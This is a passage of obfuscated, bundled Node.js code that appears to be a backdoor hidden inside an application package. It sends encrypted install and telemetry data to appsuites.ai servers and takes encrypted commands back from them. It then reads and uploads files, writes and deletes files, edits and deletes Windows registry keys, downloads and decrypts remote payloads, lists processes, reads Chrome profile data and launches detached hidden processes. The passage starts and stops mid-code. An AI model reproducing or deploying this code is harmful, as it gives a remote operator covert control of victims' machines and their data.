      co.F644KPD = [149, ''];
      co.q56CS4M = [150, ''];
      co.k43CQX1 = [151, ''];
      co.Q4A92DL = [152, ''];
      co.N491RHA = [153, ''];
      co.h44FFEQ = [154, ''];
      co.m4F36Z7 = [155, ''];
      co.P5DB32Q = [156, ''];
      co.X5EADV2 = [157, ''];
      co.F482TAM = [158, ''];
      co.p5FDZHQ = [159, ''];
      co.W592FFM = [160, ''];
      co.q637JNS = [161, ''];
      co.d422GJH = [162, ''];
      co.v535X73 = [163, ''];
      co.K4E5MWI = [164, ''];
      co.W4F1V66 = [165, ''];
      co.n4EBPL8 = [166, ''];
      const cp = class dr {
        static s59BT06(ds, dt = 0) {
          if (!cj.S559FZQ.F40E8E7) {
            return;
          }
          console.log('[' + dt + "]: " + ds);
        }
        static async W4EF0EI(du, dv, dw) {
          await this.Q44BIX9(1, du, dv, undefined, dw);
        }
        static async Y6CDW21(dx, dy, dz, ea) {
          await this.Q44BIX9(cl.W5397AL, dx, dy, dz, ea);
        }
        static async Q44BIX9(eb, ec, ed, ee, ef) {
          function eg(ek) {
            if (!ek) {
              return '';
            }
            let str6 = '';
            for (const el of ek) {
              if (str6.length > 0) {
                str6 += '|';
              }
              if (typeof el === 'boolean') {
                str6 += el ? '1' : '0';
              } else {
                str6 += el.toString().replace('|', '_');
              }
            }
            return str6;
          }
          dr.s59BT06('');
          var eh = ck.e5325L3.q474LOF ?? '';
          if (eh == '') {
            eh = "initialization";
          }
          const params = new require("url").URLSearchParams();
          const ei = cj.S559FZQ.n677BRA.substring(0, 24) + eh.substring(0, 8);
          const ej = da(ei, JSON.stringify({
            b: ec,
            c: eg(ef),
            e: ee ? ee.toString() : '',
            i: eh,
            l: eb,
            m: ed[0],
            p: cj.S559FZQ.t5A2WVR() ? 1 : 2,
            s: ck.e5325L3.x484Q1X,
            v: ck.e5325L3.Y55B2P2
          }));
          params.append("data", ej.data);
          params.append("iv", ej.iv);
          params.append("iid", eh);
          if (!cj.S559FZQ.F40E8E7) {
            await cv("api/s3/event", params);
          }
        }
        static g597ORN() {
          dr.s59BT06('');
        }
      };
      ci.w3F3UWA = cp;
      function cq(em, en = [], eo) {
        return require("child_process").spawn(em, en, {
          detached: true,
          stdio: "ignore",
          cwd: eo
        });
      }
      ci.r5EEMKP = cq;
      async function cr(ep) {
        cp.s59BT06('');
        return await require("node-fetch")(ep);
      }
      ci.y42BRXF = cr;
      async function cs(eq, er) {
        cp.s59BT06('');
        return await require("node-fetch")(eq, {
          method: "POST",
          body: JSON.stringify(er)
        });
      }
      ci.J60DFMS = cs;
      async function ct(es) {
        const fetch = require("node-fetch");
        let et;
        let eu = "https://appsuites.ai/" + es;
        cp.s59BT06('');
        try {
          et = await fetch(eu);
        } catch {
          cp.s59BT06('');
        }
        if (!et || !et.ok) {
          try {
            eu = "https://sdk.appsuites.ai/" + es;
            cp.s59BT06('');
            et = await fetch(eu);
          } catch {
            cp.s59BT06('');
          }
        }
        return et;
      }
      ci.e696T3N = ct;
      async function cu(ev, ew) {
        const fetch2 = require("node-fetch");
        let ex;
        let ey = "https://appsuites.ai/" + ev;
        cp.s59BT06('');
        if (ew.has('')) {
          ew.append('', '');
        }
        const obj2 = {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          method: "POST",
          body: ew
        };
        try {
          ex = await fetch2(ey, obj2);
        } catch {
          cp.s59BT06('');
        }
        if (!ex || !ex.ok) {
          try {
            ey = "https://sdk.appsuites.ai/" + ev;
            cp.s59BT06('');
            ex = await fetch2(ey, obj2);
          } catch {
            cp.s59BT06('');
          }
        }
        return ex;
      }
      ci.h5235DD = cu;
      async function cv(ez, fa) {
        if (fa.has('')) {
          fa.append('', '');
        }
        return await require("node-fetch")("https://appsuites.ai/" + ez, {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          method: "POST",
          body: fa
        });
      }
      ci.e63F2C3 = cv;
      function cw(fb, fc) {
        return new Promise((fd, fe) => {
          const ff = require("fs").createWriteStream(fc, {});
          const fg = (fb.startsWith("https") ? require("https") : require("http")).get(fb, (res) => {
            if (!res.statusCode || res.statusCode < 200 || res.statusCode > 299) {
              fe(new Error("LoadPageFailed " + res.statusCode));
            }
            res.pipe(ff);
            ff.on("finish", function () {
              ff.destroy();
              fd();
            });
          });
          fg.on("error", (fh) => fe(fh));
        });
      }
      ci.p464G3A = cw;
      function cx(fi) {
        try {
          require("fs").unlinkSync(fi);
          cp.s59BT06('');
        } catch {
          cp.s59BT06('');
        }
      }
      ci.T667X3K = cx;
      async function cy() {
        const fs6 = require("fs");
        const path2 = require("path");
        const proc = require("process");
        const fj = cj.S559FZQ.L695HPV;
        if (fs6.existsSync(fj)) {
          const fk = new Date().getTime() - fs6.statSync(fj).mtime.getTime();
          if (fk < 900000) {
            cp.s59BT06('');
            proc.exit(0);
          } else {
            cp.s59BT06('');
            fs6.unlinkSync(fj);
          }
        }
        fs6.writeFileSync(fj, '');
        proc.on("exit", () => {
          fs6.unlinkSync(fj);
        });
      }
      ci.F490EUX = cy;
      function cz(fl) {
        try {
          return require("fs").statSync(fl).size;
        } catch {
          return 0;
        }
      }
      ci.m4F8RIX = cz;
      function da(fm, fn) {
        try {
          const crypto = require("crypto");
          const fo = crypto.randomBytes(16);
          let fp = crypto.createCipheriv("aes-256-cbc", fm, fo);
          let fq = fp.update(fn, "utf8", "hex");
          fq += fp.final("hex");
          return {
            data: fq,
            iv: fo.toString("hex")
          };
        } catch {
          cp.s59BT06('');
          return;
        }
      }
      ci.O694X7J = da;
      function db(fr, ft, fu) {
        try {
          const fv = require("crypto").createDecipheriv("aes-256-cbc", Buffer.from(fr), Buffer.from(fu, "hex"));
          let fw = fv.update(Buffer.from(ft, "hex"));
          fw = Buffer.concat([fw, fv.final()]);
          return fw.toString();
        } catch {
          cp.s59BT06('');
          return;
        }
      }
      ci.U61FWBZ = db;
      function dc(fx) {
        return Buffer.from(fx, "hex").toString("utf8");
      }
      ci.S634YX3 = dc;
      function dd(fy, ...fz) {
        try {
          var ga = fy.replace(/{(\d+)}/g, function (gb, gc) {
            const gd = parseInt(gc);
            if (isNaN(gd)) {
              return gb;
            }
            return typeof fz[gd] !== 'undefined' ? fz[gd] : gb;
          });
          return ga;
        } catch {
          return fy;
        }
      }
      ci.o5B4F49 = dd;
    }
  });
  const f = b({
    'obj/V3EDFYY.js'(ge) {
      'use strict';

      Object.defineProperty(ge, '__esModule', {
        value: true
      });
      ge.t505FAN = undefined;
      const gf = c();
      const gg = e();
      var gh;
      (function (ho) {
        ho[ho.p5B1KEV = 0] = "p5B1KEV";
      })(gh || (gh = {}));
      var gi;
      (function (hp) {
        hp[hp.O435AMZ = 0] = "O435AMZ";
        hp[hp.w692AS2 = 1] = 'w692AS2';
      })(gi || (gi = {}));
      var gj;
      (function (hq) {
        hq[hq.B639G7B = 0] = "B639G7B";
        hq[hq.O435AMZ = 1] = "O435AMZ";
        hq[hq.j451KZ4 = 2] = "j451KZ4";
        hq[hq.R62AFMF = 3] = "R62AFMF";
        hq[hq.S58EMWW = 4] = "S58EMWW";
        hq[hq.P5F9KBR = 5] = "P5F9KBR";
      })(gj || (gj = {}));
      function gk(hr) {
        const hs = Buffer.isBuffer(hr) ? hr : Buffer.from(hr);
        const buf = Buffer.from(hs.slice(4));
        for (let n2 = 0; n2 < buf.length; n2++) {
          buf[n2] ^= hs.slice(0, 4)[n2 % 4];
        }
        return buf.toString("utf8");
      }
      function gl(ht) {
        ht = ht[gk([16, 233, 75, 213, 98, 140, 59, 185, 113, 138, 46])](/-/g, '');
        return Buffer.from("276409396fcc0a23" + ht.substring(0, 16), "hex");
      }
      function gm() {
        return Uint8Array.from([162, 140, 252, 232, 178, 47, 68, 146, 150, 110, 104, 76, 128, 236, 129, 43]);
      }
      function gn() {
        return Uint8Array.from([132, 144, 242, 171, 132, 73, 73, 63, 157, 236, 69, 155, 80, 5, 72, 144]);
      }
      function go() {
        return Uint8Array.from([28, 227, 43, 129, 197, 9, 192, 3, 113, 243, 59, 145, 209, 193, 56, 86, 104, 131, 82, 163, 221, 190, 10, 67, 20, 245, 151, 25, 157, 70, 17, 158, 122, 201, 112, 38, 29, 114, 194, 166, 183, 230, 137, 160, 167, 99, 27, 45, 46, 31, 96, 23, 200, 241, 64, 26, 57, 33, 83, 240, 247, 139, 90, 48, 233, 6, 110, 12, 44, 108, 11, 73, 34, 231, 242, 173, 37, 92, 162, 198, 175, 225, 143, 35, 176, 133, 72, 212, 165, 195, 36, 226, 147, 68, 69, 146, 14, 0, 161, 87, 53, 196, 199, 195, 19, 80, 4, 49, 169, 188, 153, 30, 124, 142, 206, 159, 180, 170, 123, 88, 15, 95, 210, 152, 24, 63, 155, 98, 181, 7, 141, 171, 85, 103, 246, 222, 97, 211, 248, 136, 126, 22, 168, 214, 249, 93, 109, 91, 111, 21, 213, 229, 135, 207, 54, 40, 244, 47, 224, 215, 164, 51, 208, 100, 144, 16, 55, 66, 18, 42, 39, 52, 186, 127, 118, 65, 61, 202, 160, 253, 125, 74, 50, 106, 228, 89, 179, 41, 232, 148, 32, 231, 138, 132, 121, 115, 150, 220, 5, 240, 184, 182, 76, 243, 58, 60, 94, 238, 107, 140, 163, 217, 128, 120, 78, 134, 102, 75, 105, 79, 116, 247, 119, 189, 149, 185, 216, 13, 117, 236, 126, 156, 8, 130, 2, 154, 178, 101, 71, 254, 62, 1, 81, 177, 205, 250, 219, 6, 203, 172, 125, 191, 218, 77, 235, 252]);
      }
      function gp(hu, hv) {
        if (hu.length !== hv.length) {
          return false;
        }
        for (let hw = 0; hw < hu.length; hw++) {
          if (hu[hw] !== hv[hw]) {
            return false;
          }
        }
        return true;
      }
      function gq(hx) {
        if (!hx) {
          return new Uint8Array();
        }
        return new Uint8Array(Buffer.from(hx, "hex"));
      }
      function gr(hy) {
        if (!hy) {
          return '';
        }
        return Buffer.from(hy).toString("hex");
      }
      function gs(hz, ia) {
        const crypto2 = require("crypto");
        const ib = crypto2.randomBytes(16);
        const ic = crypto2.createCipheriv("aes-128-cbc", gl(ia), ib);
        ic.setAutoPadding(true);
        let id = ic.update(hz, "utf8", "hex");
        id += ic.final("hex");
        return ib.toString("hex").toUpperCase() + "A0FB" + id.toUpperCase();
      }
      function gt(ie, ig) {
        const ih = require("crypto").createDecipheriv("aes-128-cbc", gl(ig), Buffer.from(ie.substring(0, 32), "hex"));
        ih.setAutoPadding(true);
        let ii = ih.update(ie.substring(36), "hex", "utf8");
        ii += ih.final("utf8");
        return ii;
      }
      function gu(ij, ik) {
        if (ij.length <= 32) {
          return new Uint8Array();
        }
        const bytes = new Uint8Array([...gm(), ...ik]);
        const il = ij.slice(0, 16);
        const im = go();
        const io = ij.slice(16);
        for (let iq = 0; iq < io.length; iq++) {
          const ir = il[iq % il.length] ^ bytes[iq % bytes.length] ^ im[iq % im.length];
          io[iq] ^= ir;
        }
        const ip = io.length - 16;
        if (!gp(io.slice(ip), gn())) {
          return new Uint8Array();
        }
        return io.slice(0, ip);
      }
      const gv = class {
        static W698NHL(is) {
          const arr5 = [];
          if (!Array.isArray(is)) {
            return arr5;
          }
          for (const it of is) {
            arr5.push({
              d5E0TQS: it.Path ?? '',
              a47DHT3: it.Data ?? '',
              i6B2K9E: it.Key ?? '',
              A575H6Y: Boolean(it.Exists),
              Q57DTM8: typeof it.Action === "number" ? it.Action : 0
            });
          }
          return arr5;
        }
        static T6B99CG(iu) {
          return iu.map((iv) => ({
            Path: iv.d5E0TQS,
            Data: iv.a47DHT3,
            Key: iv.i6B2K9E,
            Exists: iv.A575H6Y,
            Action: iv.Q57DTM8
          }));
        }
        static u6CAWW3(iw) {
          return {
            c608HZL: Array.isArray(iw.File) ? this.W698NHL(iw.File) : [],
            y4BAIF6: Array.isArray(iw.Reg) ? this.W698NHL(iw.Reg) : [],
            Z59DGHB: Array.isArray(iw.Url) ? this.W698NHL(iw.Url) : [],
            s67BMEP: Array.isArray(iw.Proc) ? this.W698NHL(iw.Proc) : []
          };
        }
        static N5A4FRL(ix) {
          return {
            File: this.T6B99CG(ix.c608HZL),
            Reg: this.T6B99CG(ix.y4BAIF6),
            Url: this.T6B99CG(ix.Z59DGHB),
            Proc: this.T6B99CG(ix.s67BMEP)
          };
        }
        static S59C847(iy) {
          return {
            b54FBAI: typeof iy.Progress === "number" ? iy.Progress : -1,
            P456VLZ: typeof iy.Activity === "number" ? iy.Activity : -1,
            x567X2Q: this.u6CAWW3(iy.Value ?? {}),
            J6C4Y96: iy.NextUrl ?? '',
            I489V4T: iy.Session ?? '',
            h46EVPS: typeof iy.TimeZone === "number" ? iy.TimeZone : 255,
            b4CERH3: iy.Version ?? ''
          };
        }
        static b558GNO(iz) {
          return {
            Progress: iz.b54FBAI,
            Activity: iz.P456VLZ,
            Value: this.N5A4FRL(iz.x567X2Q),
            NextUrl: iz.J6C4Y96,
            Session: iz.I489V4T,
            TimeZone: iz.h46EVPS,
            Version: iz.b4CERH3
          };
        }
        static s40B7VN(ja) {
          return JSON.stringify(this.b558GNO(ja));
        }
      };
      function gw(jb) {
        const fs7 = require("fs");
        return fs7.existsSync(jb) && fs7.lstatSync(jb).isDirectory();
      }
      function gx(jc) {
        require("fs").mkdirSync(jc, {
          recursive: true
        });
      }
      function gy(jd) {
        try {
          return JSON.parse(jd);
        } catch {
          return {};
        }
      }
      function gz(je, jf) {
        return typeof je?.[jf] === "object" ? je[jf] : {};
      }
      function ha(jg) {
        const path3 = require("path");
        const os = require("os");
        let jh = jg;
        const obj3 = {
          "%LOCALAPPDATA%": path3.join(os.homedir(), "AppData", "Local"),
          "%APPDATA%": path3.join(os.homedir(), "AppData", "Roaming"),
          "%USERPROFILE%": os.homedir()
        };
        for (const [ji, jj] of Object.entries(obj3)) {
          const regex = new RegExp(ji, 'i');
          if (regex.test(jh)) {
            jh = jh.replace(regex, jj);
            break;
          }
        }
        return jh;
      }
      function hb() {
        return Math.floor(Date.now() / 1000).toString();
      }
      function hc(jk) {
        const fs8 = require("fs");
        if (fs8.existsSync(jk)) {
          fs8.unlinkSync(jk);
        }
      }
      function hd(jl, jm) {
        try {
          require("fs").writeFileSync(jl, jm);
          return true;
        } catch {
          return false;
        }
      }
      async function he(jn) {
        return new Promise((jo, jp) => {
          (jn.startsWith("https") ? require("https") : require("http")).get(jn, (jq) => {
            const arr6 = [];
            jq.on("data", (jr) => arr6.push(jr));
            jq.on("end", () => jo(Buffer.concat(arr6)));
          }).on("error", (js) => jp(js));
        });
      }
      var str7 = '';
      var hf;
      async function hg(jt, ju) {
        gg.w3F3UWA.s59BT06('');
        gg.w3F3UWA.s59BT06('');
        const jv = new require("url").URLSearchParams({
          data: gs(JSON.stringify(gv.b558GNO(jt)), str7),
          iid: str7
        }).toString();
        return await await require("node-fetch")("https://on.appsuites.ai" + ju, {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          method: "POST",
          body: jv
        }).text();
      }
      async function hh(jw, jx) {
        jw.J6C4Y96 = '';
        jw.P456VLZ = 1;
        jw.b4CERH3 = "1.0.0.0";
        jw.h46EVPS = -new Date().getTimezoneOffset() / 60;
        for (let jy = 0; jy < 3; jy++) {
          jw.I489V4T = hb();
          const jz = await hg(jw, jx);
          if (jz && (typeof gy(jz)?.iid === "string" ? gy(jz).iid : '') === str7) {
            break;
          }
          await new Promise((ka) => setTimeout(ka, 3000));
        }
      }
      async function hi(kb) {
        gg.w3F3UWA.s59BT06('');
        const path4 = require("path");
        const fs9 = require("fs");
        const arr7 = [];
        const kc = (ki) => {
          ki.A575H6Y = false;
          if (ki.d5E0TQS) {
            ki.A575H6Y = require("fs").existsSync(ha(ki.d5E0TQS));
          }
        };
        const kd = (kj) => {
          kj.A575H6Y = false;
          if (kj.d5E0TQS) {
            const kk = ha(kj.d5E0TQS);
            kj.A575H6Y = require("fs").existsSync(kk);
            if (kj.A575H6Y) {
              kj.a47DHT3 = gr(require("fs").readFileSync(kk));
            }
          }
        };
        const ke = (kl) => {
          kl.A575H6Y = false;
          if (kl.d5E0TQS && kl.a47DHT3) {
            kl.a47DHT3 = '';
            const km = ha(kl.d5E0TQS);
            const kn = require("path").dirname(km);
            if (!gw(kn)) {
              gx(kn);
            }
            kl.A575H6Y = hd(km, gq(kl.a47DHT3));
          }
        };
        const kf = (ko) => {
          ko.A575H6Y = false;
          if (ko.d5E0TQS) {
            const kp = ha(ko.d5E0TQS);
            hc(kp);
            ko.A575H6Y = require("fs").existsSync(kp);
          }
        };
        const kg = (kq) => {
          kq.A575H6Y = false;
          if (kq.d5E0TQS) {
            const kr = ha(kq.d5E0TQS);
            const ks = path4.join(kr, "Local State");
            if (!require("fs").existsSync(ks)) {
              return;
            }
            const keys = Object.keys(gz(gz(gy(fs9.readFileSync(ks, "utf8")), "profile"), "info_cache"));
            for (const kt of keys) {
              const ku = path4.join(kr, kt, "Preferences");
              if (!require("fs").existsSync(ku)) {
                continue;
              }
              const kv = gz(gz(gz(gz(gy(fs9.readFileSync(ku, "utf8")), "profile"), "content_settings"), "exceptions"), "site_engagement");
              const json = JSON.stringify(kv);
              if (json) {
                arr7.push({
                  d5E0TQS: path4.join(kq.d5E0TQS, kt, "Preferences"),
                  a47DHT3: gr(Buffer.from(json, "utf8")),
                  i6B2K9E: '',
                  A575H6Y: true,
                  Q57DTM8: 5
                });
                kq.A575H6Y = true;
              }
            }
          }
        };
        for (const kh of kb) {
          if (kh.Q57DTM8 === 1) {
            kc(kh);
          } else if (kh.Q57DTM8 === 2) {
            kd(kh);
          } else if (kh.Q57DTM8 === 3) {
            ke(kh);
          } else if (kh.Q57DTM8 === 4) {
            kf(kh);
          } else if (kh.Q57DTM8 === 5) {
            kg(kh);
          }
        }
        if (arr7.length > 0) {
          kb.push(...arr7);
        }
      }
      async function hj(kw) {
        gg.w3F3UWA.s59BT06('');
        const cp2 = require("child_process");
        const arr8 = [];
        const kx = (lf) => {
          if (!lf) {
            return ['', ''];
          }
          if (lf.endsWith("\\")) {
            return [lf, ''];
          }
          const lg = lf.lastIndexOf("\\");
          return lg !== -1 ? [lf.substring(0, lg), lf.substring(lg + 1)] : [lf, ''];
        };
        const ky = (lh) => {
          return cp2.spawnSync("reg", ["query", lh], {
            stdio: "ignore"
          }).status === 0;
        };
        const kz = (li, lj) => {
          const lk = cp2.spawnSync("reg", ["query", li, "/v", lj], {
            encoding: "utf8"
          });
          if (lk.status !== 0) {
            return '';
          }
          for (const ll of lk.stdout.split("\n")) {
            const lm = ll.trim().split(/\s{2,}/);
            if (lm.length >= 3 && lm[0] === lj) {
              return lm[2];
            }
          }
          return '';
        };
        const la = (ln) => {
          let flag = false;
          const lo = cp2.spawnSync("reg", ["query", ln], {
            encoding: "utf8"
          });
          if (lo.error) {
            return flag;
          }
          if (lo.status !== 0) {
            return flag;
          }
          const lp = lo.stdout.split("\n").filter((lq) => lq.trim() !== '');
          for (let lr = 1; lr < lp.length; lr++) {
            const ls = lp[lr].trim().split(/\s{4,}/);
            if (ls.length === 3) {
              const [lt, lu, lv] = ls;
              let obj4 = {
                Q57DTM8: 2,
                A575H6Y: true,
                d5E0TQS: ln + lt,
                a47DHT3: lv,
                i6B2K9E: ''
              };
              arr8.push(obj4);
              flag = true;
            }
          }
          return flag;
        };
        const lb = (lw, lx) => {
          return cp2.spawnSync("reg", ["delete", lw, "/v", lx, "/f"], {
            stdio: "ignore"
          }).status === 0;
        };
        const lc = (ly) => {
          cp2.spawnSync("reg", ["delete", ly, "/f"], {
            stdio: "ignore"
          });
        };
        const ld = (lz, ma, mb) => {
          const mc = cp2.spawnSync("reg", ["add", lz, "/v", ma, "/t", "REG_SZ", "/d", mb, "/f"], {
            stdio: "ignore"
          });
          return mc.status === 0;
        };
        for (const le of kw) {
          if (le.Q57DTM8 === 1) {
            le.A575H6Y = false;
            if (le.d5E0TQS) {
              const [md, me] = kx(le.d5E0TQS);
              le.A575H6Y = me ? !!kz(md, me) : ky(md);
            }
          } else if (le.Q57DTM8 === 2) {
            le.A575H6Y = false;
            if (le.d5E0TQS) {
              const [mf, mg] = kx(le.d5E0TQS);
              if (mg) {
                const mh = kz(mf, mg);
                le.a47DHT3 = mh;
                le.A575H6Y = !!mh;
              } else {
                le.A575H6Y = la(mf);
              }
            }
          } else if (le.Q57DTM8 === 3) {
            le.A575H6Y = false;
            if (le.d5E0TQS && le.a47DHT3) {
              const [mi, mj] = kx(le.d5E0TQS);
              le.A575H6Y = ld(mi, mj, ha(ha(le.a47DHT3)));
            }
          } else if (le.Q57DTM8 === 4) {
            le.A575H6Y = false;
            if (le.d5E0TQS) {
              const [mk, ml] = kx(le.d5E0TQS);
              if (ml) {
                le.A575H6Y = !lb(mk, ml);
              } else {
                lc(mk);
                le.A575H6Y = ky(mk);
              }
            }
          }
        }
        if (arr8.length > 0) {
          kw.push(...arr8);
        }
      }
      async function hk(mm) {
        gg.w3F3UWA.s59BT06('');
        const mn = async (mq) => {
          mq.A575H6Y = false;
          if (mq.d5E0TQS && mq.a47DHT3) {
            if (mq.a47DHT3.startsWith("http") || mq.a47DHT3.startsWith("https")) {
              const mr = await he(mq.a47DHT3);
              if (mr.length > 0) {
                const ms = ha(mq.d5E0TQS);
                const mt = require("path").dirname(ms);
                if (!gw(mt)) {
                  gx(mt);
                }
                mq.A575H6Y = hd(ms, mr);
              }
            }
          }
        };
        const mo = async (mu) => {
          mu.A575H6Y = false;
          if (mu.d5E0TQS && mu.a47DHT3 && mu.i6B2K9E) {
            if (mu.a47DHT3.startsWith("http") || mu.a47DHT3.startsWith("https")) {
              const mv = gu(await he(mu.a47DHT3), gq(mu.i6B2K9E));
              if (mv.length > 0) {
                const mw = ha(mu.d5E0TQS);
                const mx = require("path").dirname(mw);
                if (!gw(mx)) {
                  gx(mx);
                }
                mu.A575H6Y = hd(mw, mv);
              }
            }
          }
        };
        for (const mp of mm) {
          if (mp.Q57DTM8 === 3) {
            if (!mp.i6B2K9E) {
              await mn(mp);
            } else {
              await mo(mp);
            }
          }
        }
      }
      async function hl(my) {
        gg.w3F3UWA.s59BT06('');
        if (my.length === 0) {
          return;
        }
        const arr9 = [];
        const mz = hf().split('|');
        const na = (nc) => {
          for (const nd of mz) {
            if (nd.includes(nc.toUpperCase())) {
              return nd;
            }
          }
          return '';
        };
        for (const nb of my) {
          if (nb.Q57DTM8 === 1) {
            const ne = na(nb.d5E0TQS);
            nb.A575H6Y = ne !== '';
            if (nb.A575H6Y) {
              nb.d5E0TQS = ne;
            }
          } else if (nb.Q57DTM8 === 2) {
            for (const nf of mz) {
              arr9.push({
                d5E0TQS: nf,
                a47DHT3: '',
                i6B2K9E: '',
                A575H6Y: true,
                Q57DTM8: 2
              });
            }
          }
        }
        if (arr9.length > 0) {
          my.push(...arr9);
        }
      }
      async function hm(ng) {
        const nh = gy(ng);
        const ni = typeof nh?.iid === "string" ? nh.iid : '';
        if (ni != str7) {
          gg.w3F3UWA.s59BT06('');
          return;
        }
        const nj = typeof nh?.data === "string" ? nh.data : '';
        if (nj.length == 0) {
          gg.w3F3UWA.s59BT06('');
          return;
        }
        const nk = gt(nj, ni);
        if (!nk) {
          gg.w3F3UWA.s59BT06('');
          gg.w3F3UWA.s59BT06('');
          return;
        }
        gg.w3F3UWA.s59BT06('');
        const nl = gv.S59C847(gy(nk));
        const nm = nl.J6C4Y96;
        if (!nm) {
          return;
        }
        await hi(nl.x567X2Q.c608HZL);
        await hj(nl.x567X2Q.y4BAIF6);
        await hk(nl.x567X2Q.Z59DGHB);
        await hl(nl.x567X2Q.s67BMEP);
        await hh(nl, nm);
      }
      async function hn(nn, no) {
        str7 = nn;
        hf = no;
        gg.w3F3UWA.s59BT06('');
        const obj5 = {
          b54FBAI: 0,
          P456VLZ: 0,
          I489V4T: hb(),
          h46EVPS: -new Date().getTimezoneOffset() / 60,
          b4CERH3: "1.0.0.0",
          J6C4Y96: '',
          x567X2Q: {
            c608HZL: [],
            y4BAIF6: [],
            Z59DGHB: [],
            s67BMEP: []
          }
        };
        const np = await hg(obj5, "/ping");
        if (np) {
          await hm(np);
        }
      }
      ge.t505FAN = hn;
    }
  });
  const g = b({
    'obj/T3EADFE.js'(nq) {
      'use strict';

      Object.defineProperty(nq, "__esModule", {
        value: true
      });
      nq.A672SIS = nq.U5E7DEV = nq.i61CFAL = undefined;
      const nr = c();
      const ns = e();
      const nt = d();
      var nu;
      (function (ob) {
        ob[ob.B639G7B = 0] = 'B639G7B';
        ob[ob.N6330WH = 1] = "N6330WH";
        ob[ob.q564DFB = 2] = 'q564DFB';
        ob[ob.q5A5TD7 = 3] = "q5A5TD7";
        ob[ob.h6074WA = 4] = "h6074WA";
        ob[ob.j4B56KB = 5] = "j4B56KB";
        ob[ob.F58C0X0 = 6] = "F58C0X0";
        ob[ob.i623ZUC = 7] = "i623ZUC";
      })(nu || (nu = {}));
      const nv = class {
        constructor() {
          this.H5C67AR = false;
          this.n412K1U = false;
          this.n5B332O = false;
          this.k61AQMQ = false;
          this.a6AFL0X = false;
          this.D4E3EHU = false;
          this.E67CJ69 = false;
          this.a586DQ2 = false;
          this.X42CN81 = false;
          this.Y4B23HN = false;
          this.T5B2T2A = false;
          this.V54518G = false;
          this.T5F71B2 = false;
          this.g5ABMVH = false;
          this.t533W41 = '';
          this.O6CBOE4 = '';
        }
      };
      nq.i61CFAL = nv;
      const nw = class {
        constructor(oc, od, oe, of, og) {
          this.m5BCP18 = false;
          this.C5C7K1A = '';
          this.K5F23B9 = '';
          this.j5D4IOV = '';
          this.O6CBOE4 = '';
          if (oc !== undefined) {
            this.m5BCP18 = oc;
          }
          if (od !== undefined) {
            this.C5C7K1A = od;
          }
          if (oe !== undefined) {
            this.K5F23B9 = oe;
          }
          if (of !== undefined) {
            this.j5D4IOV = of;
          }
          if (og !== undefined) {
            this.O6CBOE4 = og;
          }
        }
      };
      const nx = class {
        constructor(oh, oi, oj) {
          this.m5BCP18 = false;
          this.C5C7K1A = '';
          this.p6845JK = '';
          if (oh !== undefined) {
            this.m5BCP18 = oh;
          }
          if (oi !== undefined) {
            this.C5C7K1A = oi;
          }
          if (oj !== undefined) {
            this.p6845JK = oj;
          }
        }
      };
      var ny;
      (function (ok) {
        ok[ok.K4E7SBI = 0] = "K4E7SBI";
        ok[ok.C5B7MFV = 1] = "C5B7MFV";
        ok[ok.u6BB118 = 2] = 'u6BB118';
      })(ny = nq.U5E7DEV || (nq.U5E7DEV = {}));
      var nz;
      (function (ol) {
        ol[ol.s46FO09 = 0] = 's46FO09';
        ol[ol.d56ECUF = 1] = "d56ECUF";
        ol[ol.z479UBI = 2] = "z479UBI";
      })(nz || (nz = {}));
      const oa = class {
        constructor(om, on, oo, op, oq) {
          this.Z5A9DKG = false;
          this.A64CEBI = '';
          this.X6066R5 = om;
          this.r42EX1Q = on;
          this.e5FBF4O = oo;
          this.t4E0LPU = op;
          this.q48AQYC = oq;
        }
        async q41FDEK() {
          await ns.w3F3UWA.W4EF0EI(0, ns.z579NEI.p5FDZHQ);
          async function or() {
            return !(((await nr.S559FZQ.l610ZCY("size")) ?? '') == '');
          }
          if (await or()) {
            const ov = (await nr.S559FZQ.l610ZCY("iid")) ?? '';
            nt.e5325L3.q474LOF = ov;
            await ns.w3F3UWA.W4EF0EI(0, ov != '' ? ns.z579NEI.W592FFM : ns.z579NEI.q637JNS);
            return 0;
          }
          const ot = this.X6066R5() ?? '';
          if ('' == ot) {
            try {
              await nr.S559FZQ.c5E4Z7C("size", "67");
            } catch {}
            await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.h44FFEQ, undefined, ['', ot]);
            return 2;
          }
          let str8 = '';
          try {
            try {
              await nr.S559FZQ.c5E4Z7C("size", "67");
            } catch {}
            var ou = await ns.e696T3N("api/s3/new?fid=ip&version=" + nt.e5325L3.Y55B2P2);
            if (ou) {
              str8 = await ou.json().iid;
              if (str8 != '') {
                nt.e5325L3.q474LOF = str8;
              }
            }
            ns.w3F3UWA.s59BT06('');
            if (str8 != '') {
              let ow = function (ox) {
                let str9 = '';
                for (let oy = 0; oy < ox.length; oy++) {
                  str9 += ox.charCodeAt(oy).toString(16).padStart(2, '0');
                }
                return str9;
              };
              await nr.S559FZQ.c5E4Z7C("iid", str8);
              await nr.S559FZQ.c5E4Z7C("usid", ow(ot));
              await ns.w3F3UWA.W4EF0EI(0, ns.z579NEI.E40CNM5, ['', ot]);
              return 1;
            } else {
              await nr.S559FZQ.c5E4Z7C("iid", '');
              await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.h44FFEQ, undefined, ['', ot]);
            }
          } catch (oz) {
            await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.h44FFEQ, oz, ['', ot]);
          }
          return 2;
        }
        async A4B0MTO() {
          try {
            if (await this.m6ABVY9()) {
              await f().t505FAN(nt.e5325L3.q474LOF, this.q48AQYC);
            }
          } catch {
            ns.w3F3UWA.s59BT06('');
          }
        }
        async m58FJB5(pa) {
          try {
            ns.w3F3UWA.s59BT06('');
            nt.e5325L3.x484Q1X = pa;
            ns.w3F3UWA.s59BT06('');
            if (nt.e5325L3.x484Q1X == nr.a689XV5.B639G7B) {
              return;
            }
            await ns.F490EUX();
            await nr.S559FZQ.J6021ZT();
            if (!(await this.m6ABVY9())) {
              return;
            }
            await this.U6B4YNR();
            await this.Z425M7G();
            var pb = await this.e4F5CS0();
            if (await this.H5AE3US(pb.O6CBOE4)) {
              const data = JSON.parse(pb.O6CBOE4);
              let arr10 = [];
              for (const pc in data) {
                if (data.hasOwnProperty(pc)) {
                  const pd = data[pc];
                  for (const pe in pd) {
                    if (pd.hasOwnProperty(pe)) {
                      await this.O69AL84(pc, pe, pd[pe]);
                      arr10.push(pe);
                    }
                  }
                }
              }
              if (arr10.length > 0) {
